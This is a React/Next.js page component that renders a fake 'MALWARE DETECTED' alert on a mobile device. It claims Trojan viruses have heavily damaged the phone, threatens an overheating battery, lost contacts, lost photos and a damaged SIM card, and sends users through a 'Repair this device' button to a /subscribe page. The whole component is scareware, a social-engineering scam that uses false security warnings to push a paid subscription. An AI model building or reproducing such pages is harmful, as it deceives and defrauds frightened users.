import {
  Button,
  Container,
  Grid,
  Paper,
  makeStyles,
  Typography
} from '@material-ui/core';
import Image from 'next/image';

import BugIcon from '../public/images/bug.svg';

const useStyles = makeStyles(theme => ({
  container: {
    display: 'flex',
    alignItems: 'center',
    height: '100vh',
    paddingBottom: theme.spacing(3)
  },
  wrapper: {
    display: 'grid',
    gridTemplateRows: '1fr auto',
    alignItems: 'center',
    gridGap: theme.spacing(2),
    width: '100%',
    height: '100%'
  },
  content: {
    textAlign: 'center'
  },
  paper: {
    padding: theme.spacing(3),
    backgroundColor: theme.palette.secondary.main
  },
  image: {
    display: 'block',

    '+ &': {
      display: 'block',
      width: '100%'
    }
  }
}));

export default function Repair() {
  const classes = useStyles();

  return (
    <Container className={classes.container}>
      <div className={classes.wrapper}>
        <Grid container spacing={2}>
          <Grid item xs={12} style={{ textAlign: 'center' }}>
            <Image src={BugIcon} />
          </Grid>
          <Grid item xs={12}>
            <Paper className={classes.paper} elevation={0}>
              <Typography variant="h2" align="center" gutterBottom>
                MALWARE DETECTED
              </Typography>
              <Typography
                color="error"
                align="center"
                style={{ marginBottom: 24 }}
              >
                Action Required
              </Typography>
              <Typography style={{ marginBottom: 24 }}>
                Several Trojan viruses have been detected, your device is
                heavily damaged and needs to be repaired
              </Typography>
              <Typography style={{ fontWeight: 'bold' }}>
                If you don’t repair your device:
              </Typography>
              <ul style={{ marginBottom: 24, paddingLeft: 20 }}>
                <Typography component="li">
                  Your battery will overheat
                </Typography>
                <Typography component="li">
                  Your list of contacts will be lost
                </Typography>
                <Typography component="li">Your photos will be lost</Typography>
                <Typography component="li">
                  Your SIM-card may be demaged
                </Typography>
              </ul>
              <Typography color="error" align="center">
                Tap ‘Repair This Device’ to remove theats and clean your device
              </Typography>
            </Paper>
          </Grid>
        </Grid>
        <div>
          <Button
            variant="contained"
            color="primary"
            size="large"
            fullWidth
            href="/subscribe"
          >
            Repair this device
          </Button>
        </div>
      </div>
    </Container>
  );
}
